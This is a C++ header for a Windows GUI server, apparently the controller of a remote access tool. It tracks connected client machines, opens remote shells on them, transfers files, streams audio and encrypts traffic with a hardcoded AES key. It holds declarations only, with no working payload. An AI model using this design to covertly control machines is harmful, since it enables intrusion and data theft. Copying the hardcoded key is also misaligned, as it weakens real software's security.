#ifndef _SERVER_H
#define _SERVER_H
#include "headers.hpp"
#include "frame_client.hpp"

struct TransferStatus {
    std::string strCliente;
    std::string strNombre;
    bool isUpload = false;
    double uTamano = 0;
    double uDescargado = 0;
};

struct Archivo_Descarga {
    std::string strNombre;
    FILE* iFP;
    double uTamarchivo;
    double uDescargado;
};

struct Cliente{
    SOCKET _sckCliente = INVALID_SOCKET;
    time_t _ttUltimaVez = 0;
    std::string _id;
    std::string _strIp;
    std::string _strSo;
    std::string _strUser;
    std::string _strCpu;
    std::string _strPID;
    bool _isBusy = false;
    bool _isRunningShell = false;
    std::unordered_map<std::string, struct Archivo_Descarga> um_Archivos_Descarga2;
};

struct ClientConInfo{
    SOCKET _sckSocket;
    std::string _strPuerto;
    std::string _strIp;
};

namespace LogType{
    const int LogMessage = 100;
    const int LogError   = 101;
    const int LogWarning = 102;
}

class MyLogClass{
    public:
        wxTextCtrl *p_txtCtrl;
        void LogThis(std::string strLog, int iType);
        std::mutex log_mutex;

};

class MyListCtrl : public wxListCtrl {
public:
    MyListCtrl(wxWindow* parent,
        const wxWindowID id, const wxPoint& pos, const wxSize& size, long style)
        : wxListCtrl(parent, id, pos, size, style) {

    }

    void ShowContextMenu(const wxPoint& pos, long item);
    void OnContextMenu(wxContextMenuEvent& event);
    void OnInteractuar(wxCommandEvent& event);
    void OnRefrescar(wxCommandEvent& event);
    void OnActivated(wxListEvent& event);

private:
    wxString strTmp = "";
    wxDECLARE_EVENT_TABLE();
};

class Cliente_Handler {
    private:
        HWAVEOUT wo;
        int iRecibido = 0;
        std::thread p_thHilo;

    public:
        std::mutex mt_Archivos;
        std::mutex mt_Running;

        FrameCliente* n_Frame = nullptr;

        std::map<std::string, struct Archivo_Descarga> um_Archivos_Descarga;
        
        struct Cliente p_Cliente;
        bool isRunning = true;
        
        void Spawn_Handler();
        void Spawn_Thread();
        void CrearFrame(std::string strTitle, std::string strID);
        void EscribirSalidShell(std::string strSalida);
        bool OpenPlayer();
        void ClosePlayer() { waveOutClose(wo);}
        void PlayBuffer(char* pBuffer, size_t iLen);

        void Log(const std::string strMsg) {
            std::cout << "[" <<p_thHilo.get_id()<< "] " << strMsg << "\n";
        }

        void SetBytesRecibidos(int& iVal) {
            std::unique_lock<std::mutex> lock(mt_Running);
            iRecibido = iVal;
        }

        int BytesRecibidos() {
            std::unique_lock<std::mutex> lock(mt_Running);
            return iRecibido;
        }

        bool isfRunning() {
            std::unique_lock<std::mutex> lock(mt_Running);
            bool bFlag = isRunning;
            //Si el socket se cerro
            if (iRecibido == WSA_FUNADO) {
                bFlag = false;
            }
            return bFlag;
        }

        void JoinThread() {
            if (p_thHilo.joinable()) {
                Stop();
                p_thHilo.join();
            }
        }
        void Stop() {
            std::unique_lock<std::mutex> lock(mt_Running);
            isRunning = false;
        }

        Cliente_Handler(struct Cliente s_cliente) : p_Cliente(s_cliente) {}
        ~Cliente_Handler() {
            for (auto& archivo: um_Archivos_Descarga) {
                if (archivo.second.iFP) {
                    fclose(archivo.second.iFP);
                }
            }
        }
};

class Servidor{
    private:
        
        SOCKET sckSocket = INVALID_SOCKET;
        u_int uiPuertoLocal = 0;
        WSADATA wsa;
        struct sockaddr_in structServer;

        unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
                                  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };

        ByteArray bKey;
        void Init_Key();
        int p_PingTime = 1000 * 60; //60 segundos
    public:
        Servidor();

        std::mutex p_mutex;
        std::mutex p_transfers;
        std::mutex count_mutex;

        std::map<std::string, struct TransferStatus> vcTransferencias;

        std::vector<Cliente_Handler*> vc_Clientes;
        
        bool p_Escuchando = false;
        bool p_Transferencias = false;

        std::thread thListener;
        std::thread thPing;
        std::thread thCleanVC;
        std::thread thTransfers;
      

        //Hilos
        void m_Handler();
        void m_StopHandler();
        void m_JoinThreads();
        void m_Escucha();
        void m_Ping();
        void m_CleanVector();
        void m_MonitorTransferencias();

        //Info
        int IndexOf(std::string strID);

        //Manipular listview
        MyListCtrl *m_listCtrl;
        MyLogClass *m_txtLog;
        void m_InsertarCliente(struct Cliente& p_Cliente);
        void m_RemoverClienteLista(std::string p_ID);

        //Socket wraps
        int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false);
        int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock = false);

        //AES 256
        ByteArray bDec(const unsigned char* pInput, size_t pLen);
        ByteArray bEnc(const unsigned char* pInput, size_t pLen);

        //LZO
        int lzo_Compress(const unsigned char* cInput, lzo_uint in_len, std::shared_ptr<unsigned char[]>& cOutput, lzo_uint& out_len);
        int lzo_Decompress(const unsigned char* cInput, lzo_uint in_len, std::shared_ptr<unsigned char[]>& cOutput, lzo_uint& out_len);

        //Server
        bool   m_Iniciar();
        ClientConInfo m_Aceptar();
        void m_CerrarConexiones();
        void m_CerrarConexion(SOCKET pSocket);
        
        void charFree(char*& nBuffer, int pLen) {
            if (nBuffer) {
                ZeroMemory(nBuffer, pLen);
                delete[] nBuffer;
                nBuffer = nullptr;
            }
        }

        //thread "safe" para modificar y acceder al vector
        int m_NumeroClientes(std::mutex& mtx) {
            std::unique_lock<std::mutex> lock(mtx);
            return static_cast<int>(vc_Clientes.size());
        }

        SOCKET m_SocketCliente(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    return vc_Clientes[iIndex]->p_Cliente._sckCliente;
                }
            }
            return INVALID_SOCKET;
        }

        void m_BorrarCliente(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    vc_Clientes[iIndex]->JoinThread();
                    m_CerrarConexion(vc_Clientes[iIndex]->p_Cliente._sckCliente);
                    delete vc_Clientes[iIndex];
                    vc_Clientes[iIndex] = nullptr;
                }
            }

        }

        std::string m_ClienteID(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    return vc_Clientes[iIndex]->p_Cliente._id;
                }
            }
            return std::string("sofocante");
        }

        std::string m_ClienteIP(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    return vc_Clientes[iIndex]->p_Cliente._strIp;
                }
            }
            return std::string("sofocante");
        }
        
        bool m_IsRunning(std::mutex& mtx, int iIndex) {
            std::unique_lock<std::mutex> lock(mtx);
            bool bFlag = false;
            if (iIndex < static_cast<int>(vc_Clientes.size())) {
                if (vc_Clientes[iIndex]) {
                    bFlag = vc_Clientes[iIndex]->isfRunning();

                }
            }
            return bFlag;
        }

        bool m_Running() {
            std::unique_lock<std::mutex> lock(p_mutex);
            return p_Escuchando;
        }

        u_int m_lPuerto(){
            return uiPuertoLocal;
        }

        void m_sPuerto(int pNuevoPuerto){
            uiPuertoLocal = pNuevoPuerto;
        }

        ~Servidor(){

            if(sckSocket != INVALID_SOCKET){
                closesocket(sckSocket);
                sckSocket = INVALID_SOCKET;
            }

            if (m_txtLog != nullptr) {
                delete m_txtLog;
                m_txtLog = nullptr;
            }
       
        }
};

#endif